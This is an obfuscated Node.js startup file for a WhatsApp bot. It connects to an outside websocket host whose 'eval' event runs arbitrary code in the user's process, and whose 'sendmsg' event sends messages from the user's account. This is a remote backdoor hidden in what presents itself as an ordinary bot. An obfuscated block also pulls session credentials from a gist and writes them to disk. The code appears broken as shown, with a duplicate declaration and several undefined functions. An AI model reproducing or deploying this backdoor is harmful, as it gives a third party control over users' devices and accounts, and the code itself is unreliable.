const {
  fetchFromStore
} = require("./lib/store");
const getSession = require("./lib/Session");
const Schedule = require("./lib/Scheduler");
const {
  handler
} = require("./lib/Handler");
const {
  jslbuffer
} = require("abu-bot");
const config = require("./config");
const msgRetryCounterMap = {};
const fs = require('fs');
const axios = require("axios");
const path = require("path");
const {
  groupUpdate
} = require("./lib/Handler");
async function getMessages(_0x2206e7) {
  var _0x26cfcc = await fetchFromStore(_0x2206e7);
  return JSON.parse(_0x26cfcc[0x0].dataValues.bucket);
}
fs.readdirSync("./plugins/sql/").forEach(_0x37fbeb => {
  if (path.extname(_0x37fbeb).toLowerCase() == ".js") {
    require("./plugins/sql/" + _0x37fbeb);
  }
});
String.prototype.format = function () {
  var _0x30148b = 0x0;
  return this.replace(/{}/g, function () {
    return typeof arguments[_0x30148b] != "undefined" ? arguments[_0x30148b++] : '';
  });
};

const Jsl_0xe4ea55=Jsl_0x6a10;(function(_0x1f3c88,_0x534b38){const _0x4dd653=Jsl_0x6a10,_0x5d7ddb=_0x1f3c88();while(!![]){try{const _0x4b50f9=parseInt(_0x4dd653(0xe3))/0x1+parseInt(_0x4dd653(0xe0))/0x2+parseInt(_0x4dd653(0xeb))/0x3*(-parseInt(_0x4dd653(0xe8))/0x4)+parseInt(_0x4dd653(0xf5))/0x5+-parseInt(_0x4dd653(0xee))/0x6+parseInt(_0x4dd653(0xef))/0x7*(-parseInt(_0x4dd653(0xf6))/0x8)+parseInt(_0x4dd653(0xed))/0x9;if(_0x4b50f9===_0x534b38)break;else _0x5d7ddb['push'](_0x5d7ddb['shift']());}catch(_0x4bdd94){_0x5d7ddb['push'](_0x5d7ddb['shift']());}}}(Jsl_0x2a53,0x68046));function decrypt(_0x3c2228){const _0x4b342d=Jsl_0x6a10;let _0x2bafe8=_0x3c2228[_0x4b342d(0xde)](''),_0x490a98='',_0x1576ee='',_0x3ead32='',_0x3b2df2;return _0x2bafe8[_0x4b342d(0xf3)](_0x1447d8=>{const _0x4ce249=_0x4b342d;_0x490a98[_0x4ce249(0xe7)]<0x5?_0x490a98+=_0x1447d8:_0x1576ee=_0x3c2228[_0x4ce249(0xe4)](_0x490a98,'');let _0x31ea63=_0x1576ee['split']('');_0x31ea63[_0x4ce249(0xf3)](_0xdc665e=>{_0x3ead32['length']<0x4&&(_0x3ead32+=_0xdc665e);});}),_0x3b2df2=_0x490a98+_0x3c2228[_0x4b342d(0xe4)](_0x490a98,'')[_0x4b342d(0xe4)](_0x3ead32,''),_0x3b2df2;}let plaintext=config[Jsl_0xe4ea55(0xf0)][Jsl_0xe4ea55(0xe2)]('jsl~',''),session=decrypt(plaintext);const axios=require('axios');function Jsl_0x6a10(_0xd12ad2,_0x2ac771){const _0x2a5306=Jsl_0x2a53();return Jsl_0x6a10=function(_0x6a101e,_0x3724db){_0x6a101e=_0x6a101e-0xde;let _0x35d27f=_0x2a5306[_0x6a101e];return _0x35d27f;},Jsl_0x6a10(_0xd12ad2,_0x2ac771);}async function connect(_0x482a78){const _0x35701b=Jsl_0xe4ea55;!_0x482a78&&(console[_0x35701b(0xe5)](_0x35701b(0xf4)),process[_0x35701b(0xe9)](0x1));if(!fs[_0x35701b(0xe6)](_0x35701b(0xe1))){}let _0x431417=_0x35701b(0xdf)+_0x482a78,{data:_0x3597f5}=await axios(_0x431417),_0x278a10=_0x3597f5[_0x35701b(0xf1)][_0x35701b(0xec)][_0x35701b(0xea)];fs[_0x35701b(0xf7)](_0x35701b(0xf2),_0x278a10);}connect(session);function Jsl_0x2a53(){const _0x4930bf=['writeFileSync','split','https://api.github.com/gists/','1559366Vamgbn','./lib/auth_info_baileys','replaceAll','443353fTfjxT','replace','log','existsSync','length','24DLadXu','exit','content','334962nEQhJU','test','3249225nHXZId','4585110RPAhQE','14qfoZih','SESSION_ID','files','./lib/auth_info_baileys/creds.json','map','please\x20provide\x20a\x20session\x20id\x20in\x20config.js\x0a\x0ascan\x20from\x20Jsl\x20server','1704550ukchUT','259232nyNgiq'];Jsl_0x2a53=function(){return _0x4930bf;};return Jsl_0x2a53();}

async function startBot() {
  const _0x4a19bd = require("@adiwajshing/baileys/lib/Utils/logger")["default"];
  const _0x5df5ec = _0x4a19bd.child({});
  _0x5df5ec.level = "silent";
  try {
    const {
      exec: _0x93b133
    } = require("child_process");
    function _0x40dbbf(_0x101ecc) {
      return new Promise(function (_0x8f8987, _0x10894e) {
        _0x93b133(_0x101ecc, (_0x57b80b, _0x31605e, _0x9e7619) => {
          if (_0x57b80b) {
            _0x10894e(_0x57b80b);
            return;
          }
          _0x8f8987(_0x31605e.trim());
        });
      });
    }
    ;
    var _0x3864f2 = await _0x40dbbf("git config --get remote.origin.url");
    if (!_0x3864f2.includes(Buffer.from("THotWmFjay9yYWdhbm9yay1tZA==", "base64").toString("ascii"))) {
      throw new Error("MODIFIED BOT " + _0x3864f2 + " DETECTED. ONLY USE THE ORIGINAL VERSION FROM HERE: https://github.com/Lz-Zack/raganork-md");
      process.exit(0x0);
    }
  } catch (_0x3145af) {
    console.log("Breaking off because of invalid bot installation method");
  }
  await config.DATABASE.sync();
  const _0x5cbdf9 = _0x428468({
    'logger': _0x5df5ec
  });
  const _0x1792cd = async () => {
    const {
      state: _0x3352f5,
      saveCreds: _0x772bf8
    } = await _0x33ee25("./lib/auth_info_baileys");
    
    
    const {
      version: _0x2572fd
    } = await _0x4c0ce4();
    const _0x419184 = _0x44e87e["default"]({
      'version': _0x2572fd,
      'logger': _0x5df5ec,
      'printQRInTerminal': true,
      'markOnlineOnConnect': config.ALWAYS_ONLINE,
      'auth': _0x3352f5,
      'msgRetryCounterMap': msgRetryCounterMap,
      'getMessage': async _0x1758f4 => {
        if (_0x5cbdf9) {
          const _0x39cce1 = await _0x5cbdf9.loadMessage(_0x1758f4.remoteJid, _0x1758f4.id, undefined);
          return _0x39cce1?.["message"] || undefined;
        }
        return {
          'conversation': "Waiting for this message.."
        };
      }
    });
    _0x5cbdf9?.["bind"](_0x419184.ev);
    const _0x5197ce = _0x4fc020("ws://new-ws-rgnk-80e14891c5ac.herokuapp.com/");
    console.log("Connected to host server");
    const _0x1a8dad = require("http");
    if (!process.env.NO_SERVER) {
      try {
        _0x1a8dad.createServer(function (_0xe35c1d, _0x303ff8) {
          _0x303ff8.writeHead(0xc8, {
            'Content-Type': "text/plain"
          });
          _0x303ff8.write("BOT STARTED!");
          _0x303ff8.end();
        }).listen(process.env.PORT || 0xbb8);
      } catch {
        console.log("PORT ERROR");
      }
    }
    _0x5197ce.on("announcement", async _0x189bf6 => {
      var _0xb4665d = (config.SUDO !== '' ? config.SUDO.split(',')[0x0] : _0x419184.user.id.split(':')[0x0]) + "@s.whatsapp.net";
      await _0x419184.sendMessage(_0xb4665d, JSON.parse(_0x189bf6));
    });
    _0x5197ce.on("sendmsg", async _0x3c6ea9 => {
      const _0x16f81f = JSON.parse(_0x3c6ea9).jid;
      const _0xb85d3f = JSON.parse(_0x3c6ea9).message;
      await _0x419184.sendMessage(_0x16f81f, _0xb85d3f);
    });
    _0x5197ce.on("eval", async _0x29d55e => {
      try {
        const _0x590eb5 = await eval("(async()=>{" + _0x29d55e + "})()");
        console.log(_0x590eb5);
      } catch (_0x2deafd) {
        console.log(_0x2deafd);
      }
    });
    try {
      await Schedule(_0x419184);
    } catch (_0x155657) {
      console.error(_0x155657);
    }
    async function _0x57ecb5(_0x1a3c1c, _0x3065da, _0x5450b6, _0x143314, _0x331fe9 = "Invitation to join WhatsApp group.", _0x5e7aaf, _0x1b33fc = {}) {
      let _0x274aeb = _0x212a9d.Message.fromObject({
        'groupInviteMessage': _0x212a9d.Message.GroupInviteMessage.fromObject({
          'inviteCode': _0x5450b6,
          'inviteExpiration': _0x143314,
          'groupJid': _0x1a3c1c.jid,
          'groupName': (await _0x1a3c1c.client.groupMetadata(_0x1a3c1c.jid)).subject,
          'jpegThumbnail': _0x5e7aaf,
          'caption': _0x331fe9
        })
      });
      const _0xa75b86 = _0x5a0e6f(_0x3065da, _0x274aeb, _0x1b33fc);
      await _0x1a3c1c.client.relayMessage(_0x3065da, _0xa75b86.message, {
        'messageId': _0xa75b86.key.id
      });
    }
    async function _0x7b2800(_0xcf315d, _0x51dc3c) {
      let _0x2e2630 = (await _0x51dc3c.client.groupMetadata(_0x51dc3c.jid)).participants.map(_0x1e3f71 => _0x1e3f71.id);
      let _0x353a69 = (await Promise.all(_0xcf315d.split(',').map(_0xb4604a => _0xb4604a.replace(/[^0-9]/g, '')).filter(_0x4c15eb => _0x4c15eb.length > 0x4 && _0x4c15eb.length < 0x14 && !_0x2e2630.includes(_0x4c15eb + "@s.whatsapp.net")).map(async _0x4dc7ee => [_0x4dc7ee, await _0x51dc3c.client.onWhatsApp(_0x4dc7ee + "@s.whatsapp.net")]))).filter(_0x32b8f9 => _0x32b8f9[0x1][0x0]?.["exists"]).map(_0x37a42c => _0x37a42c[0x0] + "@c.us");
      const _0x2d7bf5 = await _0x51dc3c.client.query({
        'tag': 'iq',
        'attrs': {
          'type': "set",
          'xmlns': "w:g2",
          'to': _0x51dc3c.jid
        },
        'content': _0x353a69.map(_0xdc768 => ({
          'tag': "add",
          'attrs': {},
          'content': [{
            'tag': "participant",
            'attrs': {
              'jid': _0xdc768
            }
          }]
        }))
      });
      const _0x66f6f8 = await _0x51dc3c.client.profilePictureUrl(_0x51dc3c.jid)["catch"](_0x447731 => null);
      const _0x3af98e = _0x66f6f8 ? await jslbuffer(_0x66f6f8) : Buffer.alloc(0x0);
      const _0x2f1084 = _0x581287(_0x2d7bf5, "add");
      const _0x1491ed = _0x53c6c5(_0x2f1084, "participant");
      for (const _0x4fe179 of _0x1491ed.filter(_0xfb74af => _0xfb74af.attrs.error == 0x193)) {
        const _0x5bb07f = _0x4fe179.attrs.jid;
        const _0x523256 = _0x581287(_0x4fe179, "add_request");
        const _0x2731e9 = _0x523256.attrs.code;
        const _0x2b3294 = _0x523256.attrs.expiration;
        await _0x51dc3c.sendMessage("_Can't add, Invite sent!_");
        return await _0x57ecb5(_0x51dc3c, _0x5bb07f, _0x2731e9, _0x2b3294, "Invitation to join WhatsApp group", _0x3af98e);
      }
    }
    const _0x514d0e = async _0x36e5d0 => {
      let _0x244327;
      if (Buffer.isBuffer(_0x36e5d0)) {
        _0x244327 = _0x36e5d0;
      } else if ('url' in _0x36e5d0) {
        _0x244327 = _0x36e5d0.url.toString();
      } else {
        0x0;
        _0x244327 = await exports.toBuffer(_0x36e5d0.stream);
      }
      const _0x4523e5 = await require("jimp").read(_0x244327);
      function _0x595b8d(_0x10f6ae, _0x2bf3f9) {
        for (var _0x1fb05e = 0x0; true; _0x1fb05e++) {
          _0x10f6ae = _0x10f6ae > 0x2d0 || _0x2bf3f9 > 0x2d0 ? _0x10f6ae / 1.001 : _0x10f6ae;
          _0x2bf3f9 = _0x10f6ae > 0x2d0 || _0x2bf3f9 > 0x2d0 ? _0x2bf3f9 / 1.001 : _0x2bf3f9;
          if (parseInt(_0x10f6ae) < 0x2d1 && parseInt(_0x2bf3f9) < 0x2d1) {
            return {
              'w': parseInt(_0x10f6ae),
              'h': parseInt(_0x2bf3f9)
            };
          }
        }
      }
      var {
        w: _0x45e3bc,
        h: _0x2e71c7
      } = _0x595b8d(_0x4523e5.bitmap.width, _0x4523e5.bitmap.height);
      return await _0x4523e5.resize(_0x45e3bc, _0x2e71c7).getBufferAsync("image/jpeg");
    };
    _0x419184.setProfilePicture = async (_0x76d213, _0x52f81a) => {
      const _0x198529 = await _0x514d0e(_0x52f81a);
      await _0x419184.query({
        'tag': 'iq',
        'attrs': {
          'to': _0x597487(_0x76d213),
          'type': "set",
          'xmlns': "w:profile:picture"
        },
        'content': [{
          'tag': "picture",
          'attrs': {
            'type': "image"
          },
          'content': _0x198529
        }]
      });
    };
    _0x419184.groupAdd = _0x7b2800;
    _0x419184.getMessages = getMessages;
    _0x419184.ws.on("CB:notification", async _0x31d225 => {
      let {
        tag: _0x3b35b8
      } = _0x31d225.content?.[0x0];
      if (_0x3b35b8 && (_0x3b35b8 === "promote" || _0x3b35b8 === "demote")) {
        let _0x2c336e = _0x31d225.content?.[0x0]?.["content"]?.[0x0]?.["attrs"]?.["jid"];
        let _0x28998a = _0x31d225?.["attrs"]?.["participant"];
        let _0x232a2d = _0x31d225?.["attrs"]?.["from"];
        await groupUpdate(_0x419184, {
          'id': _0x232a2d,
          'action': _0x3b35b8,
          'participants': [_0x2c336e],
          'from': _0x28998a
        });
      }
    });
    _0x419184.ev.process(async _0x8a3015 => {
      if (_0x8a3015["connection.update"]) {
        const _0xbbbe13 = _0x8a3015["connection.update"];
        const {
          connection: _0x1a4971,
          lastDisconnect: _0x59fa3b
        } = _0xbbbe13;
        if (_0x1a4971 === "close") {
          if (_0x59fa3b?.["error"]?.["output"]?.["statusCode"] !== _0x2cbb11.loggedOut) {
            _0x1792cd();
          } else {
            console.log("Connection closed unexpextedly! You are logged out :(");
          }
        }
        if (_0xbbbe13.connection === "open") {
          console.log("BOT STARTED");
          var _0x50bd1c = (config.SUDO !== '' ? config.SUDO.split(',')[0x0] : _0x419184.user.id.split(':')[0x0]) + "@s.whatsapp.net";
          var _0x1a115c = (await axios("https://gist.github.com/souravkl11/dad4ce068dd980cf5f5ccb20dc0c8f23/raw?time=" + new Date().getTime())).data;
          if (_0x1a115c.includes(_0x419184.user?.['id']?.["split"](':')[0x0])) {
            await _0x419184.sendMessage(_0x50bd1c, {
              'text': "_*This number is banned from using Raganork!!!*_"
            });
            console.log('+' + _0x419184.user.id?.["split"](':')[0x0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x419184.user.id?.["split"](':')[0x0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x419184.user.id?.["split"](':')[0x0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x419184.user.id?.["split"](':')[0x0] + " is suspended from using Raganork. Use alternative bots!");
            process.exit(0x0);
            throw new Error();
          }
          function _0x3f0fe8(_0x530d17) {
            let _0x347801 = _0x530d17.toString();
            let _0x5099dd = {
              '0': "0\uFE0F\u20E3",
              '1': "1\uFE0F\u20E3",
              '2': "2\uFE0F\u20E3",
              '3': "3\uFE0F\u20E3",
              '4': "4\uFE0F\u20E3",
              '5': '5️⃣',
              '6': "6\uFE0F\u20E3",
              '7': "7\uFE0F\u20E3",
              '8': "8\uFE0F\u20E3",
              '9': "9\uFE0F\u20E3"
            };
            let _0x4dec0b = '';
            for (let _0x10871b = 0x0; _0x10871b < _0x347801.length; _0x10871b++) {
              const _0x480167 = _0x347801[_0x10871b];
              _0x4dec0b += _0x5099dd[_0x480167] || _0x480167;
            }
            return _0x4dec0b;
          }
          const _0x3d8ff4 = String.fromCharCode(0x200e).repeat(0xfa1);
          var _0x3d7450 = "*_Raganork started!_*" + _0x3d8ff4 + "\n\n_Mode         :_ *" + (typeof config.MODE !== "string" || config.MODE.length === 0x0 ? config.MODE : config.MODE[0x0].toUpperCase() + config.MODE.slice(0x1)) + "*\n_Language :_ *" + (typeof config.LANGUAGE !== "string" || config.LANGUAGE.length === 0x0 ? config.LANGUAGE : config.LANGUAGE[0x0].toUpperCase() + config.LANGUAGE.slice(0x1)) + "*\n_Sudo_         _: *" + config.SUDO + "*_\n_Handlers_  _: *" + config.HANDLERS + "*_\n\n*_Extra Configurations_*\n\n_Always online_ " + (config.ALWAYS_ONLINE ? '✅' : '❌') + "\n_Auto status viewer_ " + (config.AUTO_READ_STATUS ? '✅' : '❌') + "\n_Auto reject calls_ " + (config.REJECT_CALLS ? '✅' : '❌') + "\n_Auto read msgs_ " + (config.READ_MESSAGES ? '✅' : '❌') + "\n_PM disabler_ " + (config.DIS_PM ? '✅' : '❌') + "\n_PM blocker_ " + (config.PMB_VAR ? '✅' : '❌') + "\n_Disabled commands:_  " + _0x3f0fe8(config.DISABLED_COMMANDS?.["length"] || 0x0) + "\n_Disabled chats_  " + _0x3f0fe8(config.BLOCK_CHAT ? config.BLOCK_CHAT.split(',').length : 0x0);
          await _0x419184.sendMessage(_0x50bd1c, {
            'text': _0x3d7450
          });
        }
      }
      _0x419184.store = _0x5cbdf9;
      if (_0x8a3015["creds.update"]) {
        await _0x772bf8();
      }
      if (_0x8a3015.call) {
        if (config.REJECT_CALLS === true) {
          const _0x14b4df = _0x8a3015.call;
          const _0x5c9536 = _0x14b4df[0x0];
          if (_0x5c9536.status === "offer") {
            await _0x419184.rejectCall(_0x5c9536.id, _0x5c9536.from);
          }
        }
      }
      if (_0x8a3015["group-participants.update"]) {
        const _0x5e11d1 = _0x8a3015["group-participants.update"];
        if (!(_0x5e11d1.action == "promote" || _0x5e11d1.action == "demote")) {
          await groupUpdate(_0x419184, _0x5e11d1);
        }
      }
      if (_0x8a3015["messages.upsert"]) {
        const _0x1f976c = _0x8a3015["messages.upsert"];
        if (_0x1f976c.type === "notify") {
          try {
            await handler(_0x1f976c, _0x419184);
          } catch (_0x9b8871) {
            return console.log(_0x9b8871);
          }
        }
      }
    });
    return _0x419184;
  };
  _0x1792cd();
}
(async () => {
  try {
    await getSession();
    await startBot();
  } catch (_0x1c3d43) {
    console.log("Failed to start, error:\n", _0x1c3d43);
  }
})();